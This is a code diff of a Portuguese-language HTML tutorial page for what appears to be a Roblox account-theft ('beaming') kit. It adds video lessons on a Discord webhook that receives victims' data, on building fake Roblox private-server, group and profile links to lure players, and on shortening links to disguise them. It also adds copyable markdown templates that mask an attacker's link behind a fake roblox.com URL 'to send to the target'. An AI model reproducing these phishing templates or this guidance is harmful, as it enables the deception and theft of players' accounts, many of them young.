@@ -1180,7 +1180,95 @@
     .panel{ padding: calc(18px + env(safe-area-inset-top, 0px)) 16px 18px; border-radius: 0 0 22px 22px; }
     .nav-item .label{ font-size:15px; }
   }
-</style>
+
+  /* Novos estilos para modelos de links e encurtador */
+  .model-list {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-top: 16px;
+  }
+  .model-item {
+    background: var(--surface);
+    border: 1px solid var(--surface-border);
+    border-radius: 12px;
+    padding: 14px 18px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+    transition: border-color 0.2s ease;
+  }
+  .model-item:hover {
+    border-color: rgba(224, 16, 42, 0.4);
+  }
+  .model-info {
+    flex: 1;
+    min-width: 0;
+  }
+  .model-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--red-glow);
+    margin-bottom: 4px;
+  }
+  .model-text {
+    font-family: 'Space Grotesk', monospace;
+    font-size: 13px;
+    color: var(--text-muted);
+    word-break: break-all;
+    line-height: 1.4;
+  }
+  .copy-mini-btn {
+    background: rgba(224, 16, 42, 0.1);
+    border: 1px solid rgba(224, 16, 42, 0.3);
+    color: var(--red-glow);
+    border-radius: 8px;
+    padding: 6px 12px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    white-space: nowrap;
+  }
+  .copy-mini-btn:hover {
+    background: var(--red);
+    color: #fff;
+    border-color: var(--red);
+  }
+  .copy-mini-btn.copied {
+    background: #3ecf6a;
+    color: #fff;
+    border-color: #3ecf6a;
+  }
+  .tutorial-extra-btn {
+    margin-top: 20px;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 14px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid var(--surface-border);
+    border-radius: 12px;
+    color: var(--text);
+    font-size: 14px;
+    font-weight: 600;
+    transition: all 0.2s ease;
+  }
+  .tutorial-extra-btn:hover {
+    background: var(--surface);
+    border-color: rgba(224, 16, 42, 0.4);
+    transform: translateY(-2px);
+  }
+  .tutorial-extra-btn svg {
+    color: var(--red-glow);
+  }
+
+  </style>
 </head>
 <body>
 
@@ -1371,31 +1459,20 @@
             </button>
           </div>
         <div class="tab-panels">
+          
           <div class="tab-panel active" data-panel="v1">
+            <!-- Tutorial 01: Webhook -->
             <div class="site-section-header">
               <span class="site-section-badge">01</span>
               <span class="site-section-title">WEBHOOK</span>
             </div>
 
-            <div class="tutorial-card">
+            <div class="tutorial-card" style="margin-bottom: 40px;">
               <div class="video-player">
                 <div class="video-player-frame">
-                  <button class="video-play-btn" aria-label="Reproduzir">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
-                  </button>
-                </div>
-                <div class="video-controls">
-                  <span class="video-time">0:00 / 1:33</span>
-                  <div class="video-progress"><div class="video-progress-fill"></div><div class="video-progress-dot"></div></div>
-                  <span class="video-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5L6 9H2v6h4l5 4z"/><path d="M15.5 8.5a5 5 0 010 7"/></svg>
-                  </span>
-                  <span class="video-icon">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 00-2 2v3M16 3h3a2 2 0 012 2v3M8 21H5a2 2 0 01-2-2v-3M16 21h3a2 2 0 002-2v-3"/></svg>
-                  </span>
-                  <span class="video-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.6"/><circle cx="12" cy="12" r="1.6"/><circle cx="12" cy="19" r="1.6"/></svg>
-                  </span>
+                  <video style="width:100%; height:100%;" controls playsinline preload="metadata">
+                    <source src="https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/webhook-tutorial.mp4" type="video/mp4">
+                  </video>
                 </div>
               </div>
 
@@ -1405,7 +1482,112 @@
                   <span class="site-list-tag">Webhook</span>
                 </div>
                 <div class="tutorial-title">Webhook — Como as Informações são Enviadas</div>
-                <div class="tutorial-desc">Como criar um webhook discord para receber as informações das logs.</div>
+                <div class="tutorial-desc">Entenda completamente o que é um Webhook e como ele funciona no Beam para receber as informações das vítimas em tempo real. Base essencial para dominar todas as técnicas.</div>
+              </div>
+            </div>
+
+            <!-- Tutorial 02: Link Falso (Tabs) -->
+            <div class="site-section-header">
+              <span class="site-section-badge">02</span>
+              <span class="site-section-title">LINK FALSO</span>
+            </div>
+
+            <div class="tutorial-card" style="margin-bottom: 40px;">
+              <div class="video-player">
+                <div class="video-player-frame">
+                  <video id="main-tutorial-video" style="width:100%; height:100%;" controls playsinline preload="metadata">
+                    <source src="https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/link-servidor-privado.mp4" type="video/mp4">
+                  </video>
+                </div>
+              </div>
+
+              <div class="tutorial-card-body">
+                <div class="tutorial-tags" style="margin-bottom: 16px;">
+                   <button class="site-list-tag" style="cursor:pointer; border:1px solid var(--red-glow); background:rgba(224,16,42,0.1); color:var(--red-glow);" onclick="changeTutorialVideo('https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/link-servidor-privado.mp4', 'Link Falso — Servidor Privado', 'Aprenda a criar um link falso que simula um Servidor Privado do Roblox. Perfeito para atrair jogadores que buscam acesso exclusivo a servidores premium.')">Servidor Privado</button>
+                   <button class="site-list-tag" style="cursor:pointer; border:1px solid var(--surface-border); background:none; color:var(--text-muted);" onclick="changeTutorialVideo('https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/link-grupo.mp4', 'Link Falso — Grupo', 'Domine a técnica de criar links falsos de Grupos do Roblox. Ideal para enganar com promessas de rewards e benefícios exclusivos.')">Grupo</button>
+                   <button class="site-list-tag" style="cursor:pointer; border:1px solid var(--surface-border); background:none; color:var(--text-muted);" onclick="changeTutorialVideo('https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/link-perfil.mp4', 'Link Falso — Perfil', 'Crie links falsos de Perfis do Roblox com precisão. Muito efetivo para imitar perfis famosos ou amigos próximos.')">Perfil</button>
+                </div>
+                <div id="tutorial-video-title" class="tutorial-title">Link Falso — Servidor Privado</div>
+                <div id="tutorial-video-desc" class="tutorial-desc">Aprenda a criar um link falso que simula um Servidor Privado do Roblox. Perfeito para atrair jogadores que buscam acesso exclusivo a servidores premium.</div>
+              </div>
+            </div>
+
+            <!-- Tutorial 03: Encurtar Link -->
+            <div class="site-section-header">
+              <span class="site-section-badge">03</span>
+              <span class="site-section-title">ENCURTAR LINK</span>
+            </div>
+
+            <div class="tutorial-card" style="margin-bottom: 40px;">
+              <div class="video-player">
+                <div class="video-player-frame">
+                  <video style="width:100%; height:100%;" controls playsinline preload="metadata">
+                    <source src="https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/encurtar-link.mp4" type="video/mp4">
+                  </video>
+                </div>
+              </div>
+
+              <div class="tutorial-card-body">
+                <div class="tutorial-tags">
+                  <span class="site-list-tag">Tutorial 03</span>
+                  <span class="site-list-tag">Encurtador</span>
+                </div>
+                <div class="tutorial-title">Encurtar Link Falso</div>
+                <div class="tutorial-desc">Aprenda a encurtar seus links falsos para deixá-los mais discretos e convincentes. Use a ferramenta recomendada para criar URLs profissionais.</div>
+                
+                <a href="https://abre.ai" target="_blank" rel="noopener" class="tutorial-extra-btn">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.07 0l2.83-2.83a5 5 0 00-7.07-7.07l-1.5 1.5"/><path d="M14 11a5 5 0 00-7.07 0L4.1 13.83a5 5 0 007.07 7.07l1.5-1.5"/></svg>
+                  <span>Abre.ai — Encurtador de Links</span>
+                </a>
+              </div>
+            </div>
+
+            <!-- Tutorial 04: Esconder Link -->
+            <div class="site-section-header">
+              <span class="site-section-badge">04</span>
+              <span class="site-section-title">ESCONDER LINK</span>
+            </div>
+
+            <div class="tutorial-card">
+              <div class="video-player">
+                <div class="video-player-frame">
+                  <video style="width:100%; height:100%;" controls playsinline preload="metadata">
+                    <source src="https://raw.githubusercontent.com/muluck7z/brazino-beaming-site/main/disfarcar-link.mp4" type="video/mp4">
+                  </video>
+                </div>
+              </div>
+
+              <div class="tutorial-card-body">
+                <div class="tutorial-tags">
+                  <span class="site-list-tag">Tutorial 04</span>
+                  <span class="site-list-tag">Disfarce</span>
+                </div>
+                <div class="tutorial-title">Disfarçar Link com URL Falsa</div>
+                <div class="tutorial-desc">Aprenda a disfarçar o seu link com uma URL falsa do Roblox. Clique em "Copiar" no modelo desejado, substitua <strong>SEU LINK</strong> pelo seu link e envie para o alvo.</div>
+                
+                <div class="model-list">
+                  <div class="model-item">
+                    <div class="model-info">
+                      <div class="model-label">Servidor Privado</div>
+                      <div class="model-text">[https:/www.roblox.com/share?code=1f9c510c988d284fa0f84f3f9d2a998a&type=Server](SEU LINK AQUI)</div>
+                    </div>
+                    <button class="copy-mini-btn" onclick="copyModelText(this, '[https:/www.roblox.com/share?code=1f9c510c988d284fa0f84f3f9d2a998a&type=Server](SEU LINK AQUI)')">Copiar</button>
+                  </div>
+                  <div class="model-item">
+                    <div class="model-info">
+                      <div class="model-label">Grupo</div>
+                      <div class="model-text">[https:/www.roblox.com/communities/2502972105/qwearty](SEU LINK)</div>
+                    </div>
+                    <button class="copy-mini-btn" onclick="copyModelText(this, '[https:/www.roblox.com/communities/2502972105/qwearty](SEU LINK)')">Copiar</button>
+                  </div>
+                  <div class="model-item">
+                    <div class="model-info">
+                      <div class="model-label">Perfil</div>
+                      <div class="model-text">[https:/roblox.com/users/3644003255/profile](SEU LINK)</div>
+                    </div>
+                    <button class="copy-mini-btn" onclick="copyModelText(this, '[https:/roblox.com/users/3644003255/profile](SEU LINK)')">Copiar</button>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
@@ -1666,6 +1848,44 @@
       }
     });
   });
+
+  // Funções para os novos tutoriais
+  function changeTutorialVideo(src, title, desc) {
+    const video = document.getElementById('main-tutorial-video');
+    const titleEl = document.getElementById('tutorial-video-title');
+    const descEl = document.getElementById('tutorial-video-desc');
+    
+    video.src = src;
+    video.play();
+    titleEl.innerText = title;
+    descEl.innerText = desc;
+    
+    // Atualizar estilo dos botões
+    const buttons = event.target.parentElement.querySelectorAll('button');
+    buttons.forEach(btn => {
+      btn.style.border = '1px solid var(--surface-border)';
+      btn.style.background = 'none';
+      btn.style.color = 'var(--text-muted)';
+    });
+    event.target.style.border = '1px solid var(--red-glow)';
+    event.target.style.background = 'rgba(224,16,42,0.1)';
+    event.target.style.color = 'var(--red-glow)';
+  }
+
+  function copyModelText(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const originalText = btn.innerText;
+      btn.innerText = 'Copiado!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.innerText = originalText;
+        btn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+
+
+
 </script>
 </body>
 </html>
